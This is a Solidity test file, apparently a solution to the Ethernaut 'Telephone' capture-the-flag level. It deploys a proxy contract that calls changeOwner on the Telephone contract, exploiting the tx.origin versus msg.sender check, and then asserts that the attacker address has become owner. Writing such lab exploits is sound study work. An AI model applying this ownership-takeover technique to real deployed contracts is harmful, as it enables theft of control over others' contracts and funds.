// SPDX-License-Identifier: MIT

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Telephone} from "../../src/Telephone/Level.sol";

pragma solidity ^0.6.0;

interface ITelephone2 {
  function changeOwner(address) external; 
}

contract TelProxy {
  function makeACall(address telephone, address owner) external {
    ITelephone2(telephone).changeOwner(owner);
  }
}

interface ITelProxy {
  function makeACall(address telephone, address owner) external;
}

interface ITelephone {
  function changeOwner(address) external;

  function owner() external view returns(address);
}

pragma solidity ^0.6.0;

contract TelephoneTest is LevelFactory {
  ITelephone telephone;
  ITelProxy telProxy;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    telephone = ITelephone(address(new Telephone()));
    telProxy = ITelProxy(address(new TelProxy()));
  }

  function testAttack() public {
    submitLevel("Telephone");
  }

  function _performTest() internal override {
    telProxy.makeACall(address(telephone), attacker);
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    assertEq(telephone.owner(), attacker);

    return(telephone.owner() == attacker);
  }
}

